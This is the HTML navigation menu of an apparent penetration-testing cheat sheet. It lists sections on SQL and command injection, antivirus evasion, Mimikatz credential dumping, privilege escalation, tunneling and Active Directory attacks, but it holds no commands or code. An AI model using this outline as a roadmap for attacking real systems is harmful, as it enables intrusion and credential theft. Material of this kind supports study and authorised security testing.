              <a href="#35124-user-enumeration-and-privileges">3.5.1.2.4 User Enumeration and Privileges</a>
              <a href="#35125-data-extraction">3.5.1.2.5 Data Extraction</a>
              <a href="#35126-commands-execution">3.5.1.2.6 Commands Execution</a>
            </div>
            <a href="#3513-tips">3.5.1.3 Tips</a>
          </div>
          <button class="dropdown-btn">3.5.2 SQL Injection
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3521-common-sql-functions">3.5.2.1 Common SQL Functions</a>
            <a href="#3522-error-based-payloads">3.5.2.2 Error-Based Payloads</a>
            <a href="#3523-union-based-payloads">3.5.2.3 UNION-Based Payloads</a>
            <button class="dropdown-btn">3.5.2.4 Blind Payloads
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35241-checking-for-vulnerability">3.5.2.4.1 Checking for Vulnerability</a>
              <a href="#35242-extracting-database-information">3.5.2.4.2 Extracting Database Information</a>
              <a href="#35243-extracting-table-and-column-names">3.5.2.4.3 Extracting Table and Column Names</a>
              <a href="#35244-extracting-data">3.5.2.4.4 Extracting Data</a>
              <a href="#35245-boolean-based">3.5.2.4.5 Boolean-Based</a>
              <a href="#35246-time-based">3.5.2.4.6 Time-Based</a>
            </div>
            <a href="#3525-login-bypass-commands">3.5.2.5 Login Bypass Commands</a>
            <a href="#3526-vulnerable-code-example">3.5.2.6 Vulnerable Code Example</a>
          </div>
          <a href="#353-sql-truncation">3.5.3 SQL Truncation</a>
          <button class="dropdown-btn">3.5.4 Specific Databases
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <button class="dropdown-btn">3.5.4.1 MSSQL
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35411-default-databases">3.5.4.1.1 Default Databases</a>
              <a href="#35412-common-commands">3.5.4.1.2 Common Commands</a>
              <a href="#35413-statement-examples">3.5.4.1.3 Statement Examples</a>
              <a href="#35414-remote-code-execution-rce">3.5.4.1.4 Remote Code Execution (RCE)</a>
              <a href="#35415-impersonation">3.5.4.1.5 Impersonation</a>
              <a href="#35416-extra-references">3.5.4.1.6 Extra References</a>
            </div>
            <button class="dropdown-btn">3.5.4.2 MySQL
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35421-default-databases">3.5.4.2.1 Default Databases</a>
              <a href="#35422-common-commands">3.5.4.2.2 Common Commands</a>
              <a href="#35423-remote-code-execution-rce">3.5.4.2.3 Remote Code Execution (RCE)</a>
              <a href="#35424-extra-references">3.5.4.2.4 Extra References</a>
            </div>
            <button class="dropdown-btn">3.5.4.3 MariaDB
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35431-common-commands">3.5.4.3.1 Common Commands</a>
              <a href="#35432-extra-references">3.5.4.3.2 Extra References</a>
            </div>
            <button class="dropdown-btn">3.5.4.4 Oracle
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35441-common-commands">3.5.4.4.1 Common Commands</a>
              <a href="#35442-login-bypass">3.5.4.4.2 Login Bypass</a>
              <a href="#35443-union-based-injection-dump-creds">3.5.4.4.3 Union-Based Injection (Dump Creds)</a>
            </div>
          </div>

        </div>
        <button class="dropdown-btn">3.6 XXE (XML External Entity) Injection
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#361-identifying">3.6.1 Identifying</a>
          <a href="#362-local-file-disclosure">3.6.2 Local File Disclosure</a>
          <a href="#363-reading-sensitive-files">3.6.3 Reading Sensitive Files</a>
          <a href="#364-reading-source-code">3.6.4 Reading Source Code</a>
          <a href="#365-remote-code-execution">3.6.5 Remote Code Execution</a>
        </div>
        <button class="dropdown-btn">3.7 IDOR (Insecure Direct Object References)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#371-enumeration">3.7.1 Enumeration</a>
          <a href="#372-ajax-calls">3.7.2 AJAX Calls</a>
          <a href="#373-hashing--encoding">3.7.3 Hashing &amp; Encoding</a>
          <a href="#374-compare-user-roles">3.7.4 Compare User Roles</a>
          <a href="#375-insecure-apis">3.7.5 Insecure APIs</a>
        </div>
        <button class="dropdown-btn">3.8 Command Injections
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#381-identifying">3.8.1 Identifying</a>
          <a href="#382-command-methods">3.8.2 Command Methods</a>
          <button class="dropdown-btn">3.8.3 Bypassing Filters
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3831-space-is-blacklisted">3.8.3.1 Space is Blacklisted</a>
            <a href="#3832--or--are-blacklisted">3.8.3.2 <code>/</code> or <code>\</code> are Blacklisted</a>
            <a href="#3833-commands-are-blacklisted">3.8.3.3 Commands are Blacklisted</a>
            <a href="#3834-reverse-commands">3.8.3.4 Reverse Commands</a>
            <a href="#3835-encoded-commands">3.8.3.5 Encoded Commands</a>
          </div>
          <a href="#384-automatic-tools">3.8.4 Automatic Tools</a>
        </div>
        <a href="#39-log4shell">3.9 Log4Shell</a>
        <a href="#310-exploiting-cves">3.10 Exploiting CVEs</a>
      </div>
    </div>

    <div class="section-light-coral">
      <button class="dropdown-btn">4. <span class="emoji">üë•</span> Client-Side Attacks
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#41-macros">4.1 MACROS</a>
        <a href="#42-windows-library-files">4.2 Windows Library Files</a>
        <a href="#43-advanced-exploitation">4.3 Advanced Exploitation</a>
        <button class="dropdown-btn">4.4 Send Emails
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#441-normal-email">4.4.1 Normal Email</a>
          <a href="#442-email-with-authentication">4.4.2 Email with Authentication</a>
          <a href="#443-email-with-custom-headers-for-social-engineering">4.4.3 Email with Custom Headers for Social
            Engineering</a>
          <a href="#444-alternative-tool-sendemail">4.4.4 Alternative Tool <code>sendemail</code></a>
          <a href="#445-comparison-summary">4.4.5 Comparison Summary</a>
        </div>
        <button class="dropdown-btn">4.5 Exploiting LibreOffice Macros for Payload Execution
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#451-linux-targets">4.5.1 Linux Targets</a>
          <a href="#452-windows-targets">4.5.2 Windows Targets</a>
        </div>
      </div>
    </div>

    <div class="section-lavender">
      <button class="dropdown-btn">5. <span class="emoji">üõ°Ô∏è</span> Antivirus Evasion &amp; Metasploit
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <button class="dropdown-btn">5.1 In-Memory Injection with PowerShell Script
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#511-payload">5.1.1 Payload</a>
          <a href="#512-script">5.1.2 Script</a>
        </div>
        <a href="#52-shellter-automatic-tool">5.2 Shellter (Automatic Tool)</a>
        <a href="#53-metasploit">5.3 Metasploit</a>
        <button class="dropdown-btn">5.4 Msfvenom
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#541-listeners">5.4.1 Listeners</a>
          <a href="#542-main-payloads">5.4.2 Main Payloads</a>
          <a href="#543-additional-payloads">5.4.3 Additional Payloads</a>
        </div>
      </div>
    </div>

    <div class="section-salmon">
      <button class="dropdown-btn">6. <span class="emoji">üîê</span> Password Attacks
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#61-brute-force">6.1 Brute-Force</a>
        <a href="#62-spraying-credentials">6.2 Spraying Credentials</a>
        <button class="dropdown-btn">6.3 Crack Files
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#631-office-files">6.3.1 Office Files</a>
          <a href="#632-pdf-files">6.3.2 PDF Files</a>
          <a href="#633-zip-files">6.3.3 ZIP Files</a>
        </div>
        <a href="#64-http-post-login-form">6.4 HTTP POST Login Form</a>
        <a href="#65-http-get-basic-authentication">6.5 HTTP GET (Basic Authentication)</a>
        <a href="#66-calculate-cracking-time">6.6 Calculate Cracking Time</a>
        <a href="#67-mutating-wordlists">6.7 Mutating Wordlist</a>
        <a href="#68-hashcat-formats-for-cracking">6.8 Hashcat Formats for Cracking</a>
        <a href="#69-password-managers">6.9 Password Managers</a>
        <a href="#610-ssh-passphrases">6.10 SSH Passphrases</a>
        <a href="#611-linux-users-hashes">6.11 Linux Users Hashes</a>
        <button class="dropdown-btn">6.12 Mimikatz Commands
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#6121-do-not-require-credentials">6.12.1 Do Not Require Credentials</a>
          <a href="#6122-require-credentials">6.12.2 Require Credentials</a>
          <a href="#6123-mimikatz-one-liners">6.12.3 Mimikatz One-Liners</a>
        </div>
        <a href="#613-ntlm">6.13 NTLM</a>
        <a href="#614-pass-the-hash-ntlm">6.14 Pass-The-Hash NTLM</a>
        <a href="#615-cracking-net-ntlmv2">6.15 Cracking Net-NTLMv2</a>
        <a href="#616-relaying-net-ntlmv2">6.16 Relaying Net-NTLMv2</a>
        <a href="#617-online-tools">6.17 Online Tools</a>
        <button class="dropdown-btn">6.18 Default Credentials
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#6181-database-tool">6.18.1 Database Tool</a>
          <a href="#6182-most-common-credentials">6.18.2 Most Common Credentials</a>
          <a href="#6183-strategies-for-effective-password-guessing">6.18.3 Strategies for Effective Password
            Guessing</a>
          <a href="#6184-tips">6.18.4 Tips</a>
        </div>
        <a href="#619-recommended-wordlists">6.19 Recommended Wordlists</a>
        <button class="dropdown-btn">6.20 NetExec (NCX)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#6201-enumeration">6.20.1 Enumeration</a>
          <a href="#6202-spraying">6.20.2 Spraying</a>
          <a href="#6203-smb">6.20.3 SMB</a>
          <a href="#6204-ftp">6.20.4 FTP</a>
          <a href="#6205-ldap">6.20.5 LDAP</a>
          <a href="#6206-mssql">6.20.6 MSSQL</a>
          <a href="#6207-secrets-dump">6.20.7 Secrets Dump</a>
          <a href="#6208-bloodhound">6.20.8 Bloodhound</a>
          <button class="dropdown-btn">6.20.9 Useful Modules
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#62091-webdav">6.20.9.1 Webdav</a>
            <a href="#62092-veeam">6.20.9.2 Veeam</a>
            <a href="#62093-slinky">6.20.9.3 slinky</a>
            <a href="#62094-ntdsutil">6.20.9.4 ntdsutil</a>
            <a href="#62095-ldap-checker">6.20.9.5 ldap-checker</a>
            <a href="#62096-check-if-the-dc-is-vulnerable-to-zerologon-petitpotam-nopac">6.20.9.6 Check if the DC is
              vulnerable to zerologon, petitpotam, nopac</a>
            <a href="#62097-check-the-machineaccountquota">6.20.9.7 Check the MachineAccountQuota</a>
            <a href="#62098-adcs-enumeration">6.20.9.8 ADCS Enumeration</a>
            <a href="#62099-retrieve-msol-account-password">6.20.9.9 Retrieve MSOL Account Password</a>
            <a href="#620910-ntlm-relay-attack">6.20.9.10 NTLM Relay Attack</a>
          </div>
          <a href="#62010-impersonate-logged-on-users">6.20.10 Impersonate logged-on Users</a>
          <a href="#62011-multi-domain-environment">6.20.11 Multi-Domain Environment</a>
        </div>
      </div>
    </div>

    <div class="section-seafoam">
      <button class="dropdown-btn">7. <span class="emoji">ü™ü</span> Windows Privilege Escalation
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#71-enumeration">7.1 Enumeration</a>
        <a href="#72-finding-files-in-directories">7.2 Finding Files in Directories</a>
        <a href="#73-powershell-goldmine-logs">7.3 PowerShell Goldmine (Logs)</a>
        <button class="dropdown-btn">7.4 Abusing Privileges
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#741-check-assigned-privileges">7.4.1 Check Assigned Privileges</a>
          <a href="#742-enable-all-tokens">7.4.2 Enable All Tokens</a>
          <a href="#743-token-privileges-table">7.4.3 Token Privileges Table</a>
          <a href="#744-fullpowersexe">7.4.4 FullPowers.exe</a>
        </div>
        <button class="dropdown-btn">7.5 Service Binary Hijacking
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#751-basic-and-main-checks">7.5.1 Basic and Main Checks</a>
          <a href="#752-additional-optional-checks">7.5.2 Additional Optional Checks</a>
        </div>
        <a href="#76-service-dll-hijacking">7.6 Service DLL Hijacking</a>
        <a href="#77-unquoted-service-paths">7.7 Unquoted Service Paths</a>
        <a href="#78-scheduled-tasks">7.8 Scheduled Tasks</a>
        <button class="dropdown-btn">7.9 Internal Services
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#791-display-active-network-connections">7.9.1 Display Active Network Connections</a>
          <a href="#792-types-addresses">7.9.2 Types of Addresses</a>
        </div>
        <button class="dropdown-btn">7.10 Cleartext Password Finding
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#7101-using-findstr">7.10.1 Using Findstr</a>
          <a href="#7102-searching-in-configuration-files">7.10.2 Searching in Configuration Files</a>
          <a href="#7103-check-specific-files">7.10.3 Check Specific Files</a>
          <a href="#7104-searching-for-vnc-password-files">7.10.4 Searching for VNC Password Files</a>
        </div>
        <button class="dropdown-btn">7.11 Shadow Copies (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#7111-key-files-to-target">7.11.1 Key Files to Target</a>
          <a href="#7112-dumping-sam-and-system-files">7.11.2 Dumping SAM and SYSTEM Files</a>
          <a href="#7113-accessing-ntdsdit-active-directory-database">7.11.3 Accessing NTDS.dit (Active Directory
            Database)</a>
          <a href="#7114-dumping-security-hive-for-lsa-secrets--cached-credentials">7.11.4 Dumping SECURITY Hive for
            LSA
            Secrets &amp; Cached Credentials</a>
          <a href="#7115-extracting-user-specific-credentials-from-ntuserdat">7.11.5 Extracting User-Specific
            Credentials
            from NTUSER.dat</a>
          <a href="#7116-general-volume-shadow-copy-access">7.11.6 General Volume Shadow Copy Access</a>
        </div>
        <button class="dropdown-btn">7.12 AlwaysElevated Registry Check
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#7121-how-to-check-for-the-vulnerability">7.12.1 How to Check for the Vulnerability</a>
          <a href="#7122-interpreting-the-results">7.12.2 Interpreting the Results</a>
          <a href="#7123-exploiting-the-vulnerability">7.12.3 Exploiting the Vulnerability</a>
        </div>
        <button class="dropdown-btn">7.13 Scripts
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#7131-winpeas">7.13.1 WinPEAS</a>
          <a href="#7132-powerup">7.13.2 PowerUp</a>
          <a href="#7133-powercat">7.13.3 PowerCat</a>
          <a href="#7134-powerview">7.13.4 PowerView</a>
          <a href="#7135-powermad">7.13.5 PowerMad</a>
          <a href="#7136-privesccheck">7.13.6 PrivescCheck</a>
          <a href="#7137-seatbelt">7.13.7 Seatbelt</a>
          <button class="dropdown-btn">7.13.8 PowerSharpPack
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#71381-setup">7.13.8.1 Setup</a>
            <a href="#71382-included-tools-and-code-examples">7.13.8.2 Included Tools and Code Examples</a>
            <a href="#71383-standalone-scripts">7.13.8.3 Standalone Scripts</a>
          </div>
        </div>
        <button class="dropdown-btn">7.14 Potatoes
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#7141-dcompotato">7.14.1 DCOMPotato</a>
          <a href="#7142-efspotato">7.14.2 EfsPotato</a>
          <a href="#7143-godpotato">7.14.3 GodPotato</a>
          <a href="#7144-hot-potato-cve-2016-3225">7.14.4 Hot Potato (CVE-2016-3225)</a>
          <a href="#7145-juicy-potato">7.14.5 Juicy Potato</a>
          <a href="#7146-printspoofer">7.14.6 PrintSpoofer</a>
          <a href="#7147-rogue-potato">7.14.7 Rogue Potato</a>
          <a href="#7148-rottenpotato">7.14.8 RottenPotato</a>
          <a href="#7149-sharpefspotato">7.14.9 SharpEfsPotato</a>
          <a href="#71410-sigmapotato">7.14.10 SigmaPotato</a>
          <a href="#71411-sweetpotato">7.14.11 SweetPotato</a>
        </div>
        <button class="dropdown-btn">7.15 Exploits
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#7151-cve-2023-29360">7.15.1 CVE-2023-29360</a>
          <a href="#7152-seassignprimarytoken">7.15.2 SeAssignPrimaryToken</a>
          <a href="#7153-sebackup">7.15.3 SeBackup</a>
          <a href="#7154-sedebug">7.15.4 SeDebug</a>
          <a href="#7155-seimpersonate">7.15.5 SeImpersonate</a>
          <a href="#7156-semanagevolumeabuse">7.15.6 SeManageVolumeAbuse</a>
          <a href="#7157-serestore">7.15.7 SeRestore</a>
        </div>
      </div>
    </div>

    <div class="section-soft-grey">
      <button class="dropdown-btn">8. <span class="emoji">üêß</span> Linux Privilege Escalation
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#81-enumeration">8.1 Enumeration</a>
        <a href="#82-inspecting-service-footprints">8.2 Inspecting Service Footprints</a>
        <a href="#83-cron-jobs">8.3 Cron Jobs</a>
        <button class="dropdown-btn">8.4 Password Files
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#841-etcpasswd">8.4.1 <em>/etc/passwd</em></a>
          <a href="#842-etcshadow">8.4.2 <em>/etc/shadow</em></a>
        </div>
        <button class="dropdown-btn">8.5 Setuid Binaries and Capabilities
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#851-setuid-binaries">8.5.1 Setuid Binaries</a>
          <a href="#852-exploiting-setuid-binaries">8.5.2 Exploiting Setuid Binaries</a>
          <a href="#853-capabilities">8.5.3 Capabilities</a>
          <a href="#854-table-of-capabilities">8.5.4 Table of Capabilities</a>
        </div>
        <a href="#86-abusing-sudo">8.6 Abusing <em>SUDO</em></a>
        <a href="#87-kernel-exploitations">8.7 Kernel Exploitations</a>
        <button class="dropdown-btn">8.8 Wildcard Exploitation
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#881-wildcard-basics">8.8.1 Wildcard Basics</a>
          <a href="#882-exploitation-guide">8.8.2 Exploitation Guide</a>
          <a href="#883-exploiting-wildcards-in-command-execution">8.8.3 Exploiting Wildcards in Command Execution</a>
          <a href="#884-exploiting-wildcards-in-file-operations">8.8.4 Exploiting Wildcards in File Operations</a>
        </div>
        <a href="#89-disk-group-permissions">8.9 Disk Group Permissions</a>
        <a href="#810-mysql-privilege-escalation">8.10 MySQL Privilege Escalation</a>
        <a href="#811-user-installed-software">8.11 User-Installed Software</a>
        <a href="#812-weak-reused-and-plaintext-passwords">8.12 Weak, Reused, and Plaintext Passwords</a>
        <button class="dropdown-btn">8.13 Internal Services
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#8131-display-active-network-connections">8.13.1 Display Active Network Connections</a>
          <a href="#8132-types-of-addresses">8.13.2 Types of Addresses</a>
        </div>
        <a href="#814-world-writable-scripts-invoked-as-root">8.14 World-Writable Scripts Invoked as Root</a>
        <a href="#815-unmounted-filesystems">8.15 Unmounted FileSystems</a>
        <button class="dropdown-btn">8.16 SUID and GUID Files
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#8161-understanding-suid-and-guid">8.16.1 Understanding SUID and GUID</a>
          <a href="#8162-finding-suid-and-guid-files">8.16.2 Finding SUID and GUID Files</a>
          <a href="#8163-determining-exploitability">8.16.3 Determining Exploitability</a>
        </div>
        <button class="dropdown-btn">8.17 Internal Services
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#8171-linpeas">8.17.1 LinPEAS</a>
          <a href="#8172-linenum">8.17.2 LinEnum</a>
          <a href="#8173-unix-privesc-check">8.17.3 Unix-privesc-check</a>
          <a href="#8174-checksec">8.17.4 Checksec</a>
          <a href="#8175-peepdf">8.17.5 Peepdf</a>
          <a href="#8176-exploit-suggester">8.17.6 Exploit Suggester</a>
        </div>
      </div>
    </div>

    <div class="section-sky-blue">
      <button class="dropdown-btn">9. <span class="emoji">üîÄ</span> Port Redirection and Manual Tunneling
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#91-port-redirection-with-socat">9.1 Port Redirection with Socat</a>
        <a href="#92-ssh-local-port-forwarding">9.2 SSH Local Port Forwarding</a>
        <a href="#93-ssh-dynamic-port-forwarding">9.3 SSH Dynamic Port Forwarding</a>
        <a href="#94-ssh-remote-port-forwarding">9.4 SSH Remote Port Forwarding</a>
        <a href="#95-ssh-remote-dynamic-port-forwarding">9.5 SSH Remote Dynamic Port Forwarding</a>
        <a href="#96-ssh-windows">9.6 SSH (Windows)</a>
        <a href="#97-plink-windows">9.7 Plink (Windows)</a>
        <a href="#98-netsh-windows">9.8 Netsh (Windows)</a>
      </div>
    </div>

    <div class="section-peach">
      <button class="dropdown-btn">10. <span class="emoji">‚õìÔ∏è</span> Tunneling Through Tools
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <button class="dropdown-btn">10.1 Ligolo (Direct Subnetting)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1011-normal-tunneling">10.1.1 Normal Tunneling</a>
          <a href="#1012-double-tunneling">10.1.2 Double Tunneling</a>
          <a href="#1013-local-port-forwarding">10.1.3 Local Port Forwarding</a>
          <a href="#1014-reverse-shells-from-internal-networks">10.1.4 Reverse Shells From Internal Networks</a>
          <a href="#1015-file-transfers-from-internal-networks">10.1.5 File Transfers From Internal Networks</a>
        </div>
        <button class="dropdown-btn">10.2 Chisel (HTTP Tunneling)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1021-port-forwarding">10.2.1 Port Forwarding</a>
          <a href="#1022-reverse-port-forwarding">10.2.2 Reverse Port Forwarding</a>
          <a href="#1023-forward-dynamic-socks-proxy">10.2.3 Forward Dynamic SOCKS Proxy</a>
          <a href="#1024-reverse-dynamic-socks-proxy">10.2.4 Reverse Dynamic SOCKS Proxy</a>
        </div>
        <a href="#103-dnscat2-dns-tunneling">10.3 Dnscat2 (DNS Tunneling)</a>
      </div>
    </div>

    <div class="section-dusty-rose">
      <button class="dropdown-btn">11. <span class="emoji">üìú</span> Active Directory Theory
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#111-overview">11.1 Overview</a>
        <a href="#112-authentication">11.2 Authentication</a>
        <a href="#113-credential-storage--hash-dumping">11.3 Credential Storage &amp; Hash Dumping</a>
        <a href="#114-common-attack-vectors">11.4 Common Attack Vectors</a>
        <a href="#115-lateral-movement">11.5 Lateral Movement</a>
        <a href="#116-persistence">11.6 Persistence</a>
      </div>
    </div>

    <div class="section-pastel-green">
      <button class="dropdown-btn">12. <span class="emoji">üïµÔ∏è‚Äç‚ôÇÔ∏è</span> Active Directory Enumeration
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <button class="dropdown-btn">12.1 Initial Recon with Nmap
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#1211-dns-enumeration-port-53">12.1.1 DNS Enumeration (Port 53)</a>
          <a href="#1212-kerberos-enumeration-port-88">12.1.2 Kerberos Enumeration (Port 88)</a>
          <a href="#1213-ldap-enumeration-port-389636">12.1.3 LDAP Enumeration (Port 389/636)</a>
          <a href="#1214-smbnetbios-enumeration-port-445">12.1.4 SMB/NetBIOS Enumeration (Port 445)</a>
          <a href="#1215-winrm-enumeration-and-access-port-5985">12.1.5 WinRM Enumeration and Access (Port 5985)</a>
        </div>
        <a href="#122-basic-enumeration">12.2 Basic Enumeration</a>
        <a href="#123-powerview">12.3 PowerView</a>
        <a href="#124-service-principal-names-spn-enumeration">12.4 Service Principal Names (SPN) Enumeration</a>
        <a href="#125-object-permissions-enumeration">12.5 Object Permissions Enumeration</a>
        <a href="#126-domain-shares-enumeration">12.6 Domain Shares Enumeration</a>
        <a href="#127-bloodhound--sharphound">12.7 BloodHound &amp; SharpHound</a>
        <a href="#128-extracting-and-cracking-password-hashes">12.8 Extracting and Cracking Password Hashes</a>
        <a href="#129-ms-rprn-print-spooler-service-exploitation">12.9 MS-RPRN Print Spooler Service Exploitation</a>
        <a href="#1210-common-spns-for-service-accounts">12.10 Common SPNs for Service Accounts</a>
        <button class="dropdown-btn">12.11 GPP Passwords Abuse (Group Policy Preferences)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#12111-gpp-main-method-for-extraction">12.11.1 GPP Main Method for Extraction</a>
          <a href="#12112-impacket-get-gpppassword">12.11.2 Impacket-Get-GPPPassword</a>
          <a href="#12113-smb-share-sysvol">12.11.3 SMB Share-SYSVOL</a>
          <a href="#12114-crackmapexec">12.11.4 CrackMapExec</a>
        </div>
        <button class="dropdown-btn">12.12 Scripts (adPEAS)
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#12121-importing-the-module">12.12.1 Importing the Module</a>
          <a href="#12122-basic-usage">12.12.2 Basic Usage</a>
          <a href="#12123-module-specific-usage">12.12.3 Module-Specific Usage</a>
        </div>
        <button class="dropdown-btn">12.13 Group Managed Service Accounts (gMSAs) Abuse
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">12.13.1 Identifying Group Managed Service Accounts (gMSAs)
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#121311-manual-discovery-of-gmsas">12.13.1.1 Manual Discovery of gMSAs</a>
            <a href="#121312-automated-discovery-with-bloodhound">12.13.1.2 Automated Discovery with BloodHound</a>
          </div>
          <button class="dropdown-btn">12.13.2 GMSA Password Retrieval with GMSAPasswordReader
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#121321-usage">12.13.2.1 Usage</a>
            <a href="#121322-additional-notes">12.13.2.2 Additional Notes</a>
          </div>
          <a href="#12133-alternative-commands">12.13.3 Alternative Commands</a>
        </div>
        <a href="#1214-group-policy-object-gpo-abuse">12.14 Group Policy Object (GPO) Abuse</a>
        <button class="dropdown-btn">12.15 Enumerating Domain Controller
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#12151-using-enum4linux">12.15.1 Using Enum4linux</a>
          <a href="#12152-using-crackmapexec">12.15.2 Using CrackMapExec</a>
          <a href="#12153-using-ldapsearch">12.15.3 Using Ldapsearch</a>
          <a href="#12154-using-rpcclient">12.15.4 Using Rpcclient</a>
          <a href="#12155-using-smbclient">12.15.5 Using Smbclient</a>
          <a href="#12156-using-bloodhound-sharphound">12.15.6 Using BloodHound (SharpHound)</a>
          <a href="#12157-using-nmap">12.15.7 Using Nmap</a>
          <a href="#12158-using-kerbrute">12.15.8 Using Kerbrute</a>
          <a href="#12159-using-powershell-if-allowed">12.15.9 Using PowerShell (if allowed)</a>
        </div>
        <button class="dropdown-btn">12.16 Enumerating with CrackMapExec
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#12161-tips-for-crackmapexec-enumeration">12.16.1 Tips for CrackMapExec Enumeration</a>
          <a href="#12162-user-enumeration">12.16.2 User Enumeration</a>
          <a href="#12163-shares-enumeration">12.16.3 Shares Enumeration</a>
          <a href="#12164-group-enumeration">12.16.4 Group Enumeration</a>
          <a href="#12165-password-policy-enumeration">12.16.5 Password Policy Enumeration</a>
          <a href="#12166-local-accounts-enumeration">12.16.6 Local Accounts Enumeration</a>
          <a href="#12167-ldap-enumeration">12.16.7 LDAP Enumeration</a>
          <a href="#12168-mssql-enumeration">12.16.8 MSSQL Enumeration</a>
        </div>
      </div>
    </div>

    <div class="section-light-gold">
      <button class="dropdown-btn">13. <span class="emoji">üëæ</span> Active Directory Attacking
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#131-as-rep-roasting">13.1 AS-REP Roasting</a>
        <a href="#132-kerberoasting">13.2 Kerberoasting</a>
        <a href="#133-silver-tickets">13.3 Silver Tickets</a>
        <a href="#134-golden-tickets">13.4 Golden Tickets</a>
        <a href="#135-domain-controller-synchronization-dc-sync">13.5 Domain Controller Synchronization (DC Sync)</a>
        <a href="#136-cached-ad-credentials">13.6 Cached AD Credentials</a>
        <a href="#137-ntlm-authentication">13.7 NTLM Authentication</a>
        <a href="#138-kerberos-authentication">13.8 Kerberos Authentication</a>
        <button class="dropdown-btn">13.9 Password Attacks
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">13.9.1 Spraying Creds with Script
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#13911-running-the-script">13.9.1.1 Running the Script</a>
            <a href="#13912-source-code-of-the-script">13.9.1.2 Source Code of the Script</a>
          </div>
          <a href="#1392-authenticating-using-directoryentry">13.9.2. Authenticating using DirectoryEntry</a>
          <button class="dropdown-btn">13.9.3 Using CrackMapExec
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#13931-basic-commands">13.9.3.1 Basic Command</a>
